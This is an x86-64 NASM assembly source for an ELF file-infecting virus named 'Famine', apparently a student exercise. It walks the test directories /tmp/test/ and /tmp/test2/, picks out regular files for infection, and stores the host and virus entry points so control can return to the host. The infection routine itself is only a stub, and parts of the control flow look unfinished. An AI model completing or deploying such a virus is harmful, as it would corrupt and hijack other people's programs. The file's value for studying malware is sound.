global _start
section .text

%define data(x)       [(rsp - data_size) + data.%+x]

STUB_SIZE:      equ (_end - _start)
DIRENT_ARR_SIZE:    equ 1024

; syscalls
SYS_READ:       equ 0
SYS_WRITE:      equ 1
SYS_OPEN:       equ 2
SYS_CLOSE:      equ 3
SYS_LSEEK:      equ 8
SYS_MMAP:       equ 9
SYS_MPROTECT:   equ 10
SYS_EXIT:       equ 60
SYS_GETDENTS:   equ 78

; open flags
O_RDONLY:       equ 0
O_WRONLY:       equ 1
O_RDWR:         equ 2
O_DIRECTORY:    equ 65536

; mmap flags
MAP_SHARED:     equ 0x01
MAP_PRIVATE:    equ 0x02

; mprotect flags
PROT_READ:  equ 0x01
PROT_WRITE: equ 0x02
PROT_EXEC:  equ 0x04

; lseek flags
SEEK_SET:   equ 0
SEEK_CUR:   equ 1
SEEK_END:   equ 2

; ELF
; e_ident
EI_NIDENT:      equ 16
EI_MAG0:        equ 0
ELFMAG0:        equ 0x7f
EI_MAG1:        equ 1
ELFMAG1:        equ 'E'
EI_MAG2:        equ 2
ELFMAG2:        equ 'L'
EI_MAG3:        equ 3
ELFMAG3:        equ 'F'
EI_CLASS:       equ 4
ELFCLASS64:     equ 2
EI_DATA:        equ 5
ELFDATANONE:    equ 0
EI_VERSION:     equ 6
EV_CURRENT:     equ 1
EI_PAD:         equ 9

; e_type
ET_NONE:    equ 0
ET_REL:     equ 1
ET_EXEC:    equ 2
ET_DYN:     equ 3
ET_CORE:    equ 4
ET_NUM:     equ 5

struc	stat
    .st_dev			resq	1	; ID of device containing file
    .__pad1			resw	1	; Padding
    .st_ino			resq	1	; Inode number
    .st_mode		resd	1	; File type and mode
    .st_nlink		resq	1	; Number of hard links
    .st_uid			resd	1	; User ID of owner
    .st_gid			resd	1	; Group ID of owner
    .st_rdev		resq	1	; Device ID (if special file)
    .__pad2			resw	1	; Padding
    .st_size		resq	1	; Total size, in bytes
    .st_blksize		resq	1	; Block size for filesystem I/O
    .st_blocks		resq	1	; Number of 512B blocks allocated
    .st_atim		resq	2	; Time of last access
    .st_mtim		resq	2	; Time of last modification
    .st_ctim		resq	2	; Time of last status change
    .__unused		resq	3	; Unused
endstruc

struc Elf64_Ehdr
    .e_ident        resb EI_NIDENT
    .e_type         resw 1
    .e_machine      resw 1
    .e_version      resd 1
    .e_entry        resq 1
    .e_phoff        resq 1
    .e_shoff        resq 1
    .e_flags        resd 1
    .e_ehsize       resw 1
    .e_phentsize    resw 1
    .e_phnum        resw 1
    .e_shentsize    resw 1
    .e_shnum        resw 1
    .e_shstrndx     resw 1
endstruc

struc Elf64_Shdr
    .sh_name        resd 1
    .sh_type        resd 1
    .sh_flags       resq 1
    .sh_addr        resq 1
    .sh_offset      resq 1
    .sh_size        resq 1
    .sh_link        resw 1
    .sh_info        resw 1
    .sh_addralign   resq 1
    .sh_entsize     resq 1
endstruc

; dirent
; d_type
DT_REG: equ 8

struc	dirent
    .d_ino:			resq	1
    .d_off:			resq	1
    .d_reclen		resw	1
    ; char d_name[] - flexible array member, size can
    ; be calculated from d_reclen
    .d_name			resb	1
    ; pad
    ; d_type (dirent + d_reclen - 1)
endstruc

struc data
    .base_address   resq 1
    .dirent_array   resb DIRENT_ARR_SIZE
    .dir_fd         resq 1
endstruc

_start:
    push rdi
    push rsi
    push rcx
    push rdx

    push rbp
    mov rbp, rsp
    ; NASM automatically creates a <name>_size constant for strucs
    sub rbp, data_size

    lea rax, [rel _start]
    mov rdx, [rel virus_entry]
    sub rax, rdx
    add rax, [rel host_entry]
    push rax

    ; call get_base_address
    ; mov data(base_address), rax

    lea r15, [rel infect_directories]
    .open_directory:
        mov rdi, [r15]
        test rdi, rdi
        jz _host
        mov rax, SYS_WRITE
        lea rsi, [rel directory_msg]
        mov rdi, 1
        mov rdx, 4
        syscall
        mov rsi, O_DIRECTORY | O_RDONLY
        mov rax, SYS_OPEN
        syscall
        test rax, rax
        jl .close_directory
        mov data(dir_fd), rax
    .read_directory:
        mov rdx, DIRENT_ARR_SIZE
        lea rsi, data(dirent_array)
        mov rdi, data(dir_fd)
        mov rax, SYS_GETDENTS
        syscall
        test rax, rax
        jle .close_directory
        xor r13, r13 ; offset counter for directory entries
        mov r12, rax ; number of bytes read by getdents
    .process_file:
        lea rdi, data(dirent_array)
        add rdi, r13
        ; d_type is the last field in the dirent struct, which has
        ; a variable length due to the d_name field
        movzx edx, WORD [rdi + dirent.d_reclen]
        mov al, BYTE [rdi + rdx - 1]
        ; store address of file currently being processed
        add rdi, dirent.d_name
        add r13, rdx
        cmp al, DT_REG
        jne .next_file
        call do_infect
    .next_file:
        cmp r13, r12
        jl .process_file
        jmp .read_directory
    .close_directory:
        mov rdi, data(dir_fd)
        mov rax, SYS_CLOSE
        syscall
    .next_directory:
        add r15, 8
        jnz .open_directory

    add rsp, data_size
    pop rbp

    pop rax
    pop rbp
    pop rdx
    pop rcx
    pop rdi
    pop rdi
    jmp rax

do_infect:
    jmp exit

; in: -
; out: base_address (rax)
get_base_address:
    mov rsi, O_RDONLY
    lea rdi, [rel proc_self_maps]
    mov rax, SYS_OPEN
    syscall
    cmp eax, 0
    jl exit

    push rax

    sub rsp, 16

    xor r10, r10
    xor r8, r8
    xor rdi, rdi
    xor rdx, rdx
    xor rbx, rbx

    mov rdx, 1
    lea rsi, [rsp]
    mov edi, eax
    read_proc_map:
        mov rax, SYS_READ
        syscall

        cmp eax, 1
        jl exit

        cmp BYTE [rsp], '-'
        je break
        inc r10b
        mov r8b, BYTE [rsp]

        cmp r8b, '9'
        jle num
    ; read_proc_map
    alpha:
        sub r8b, 'a' - 10
        jmp load
    ; alpha
    num:
        sub r8b, '0'
    ; num
    load:
        shl rbx, 4
        or rbx, r8
        add rsp, 1
        lea rsi, [rsp]
        jmp read_proc_map
    ; load
    break:
        sub sp, r10w
        add rsp, 16

        pop rdi
        mov rax, SYS_CLOSE
        syscall
        cmp eax, 0
        jl exit
    ; break
    mov rax, rbx
    ret
; get_base_address

exit:
    mov rax, SYS_EXIT
    xor rdi, rdi
    syscall
; exit

infect_directories:
    dq tmp_test, tmp_test2, 0
tmp_test:
    db "/tmp/test/", 0
tmp_test2:
    db "/tmp/test2/", 0
proc_self_exe:
    db "/proc/self/exe", 0
proc_self_maps:
    db "/proc/self/maps", 0
not_64_bit_msg:
    db "Not a 64 bit ELF", 10
not_elf_msg:
    db "Not an ELF", 10
file_path:
    db "Famine", 0
signature:
    db "abied-ch:ef082ac137069c1ef08f0a6d54ea4d2f4e180fb2769b9bb9f137cc5f98f5f4fe", 0
do_infect_msg:
    db "INFECT", 10
virus_entry:
    dq _start
host_entry:
    dq _host
directory_msg:
    db "dir", 10
host_msg:
    db "host", 10
_end:

_host:
    push rax
    push rdi
    push rsi
    push rdx
    mov rax, SYS_WRITE
    mov rdi, 1
    lea rsi, [rel host_msg]
    mov rdx, 5
    syscall
    pop rdx
    pop rsi
    pop rdi
    pop rax
    jmp exit
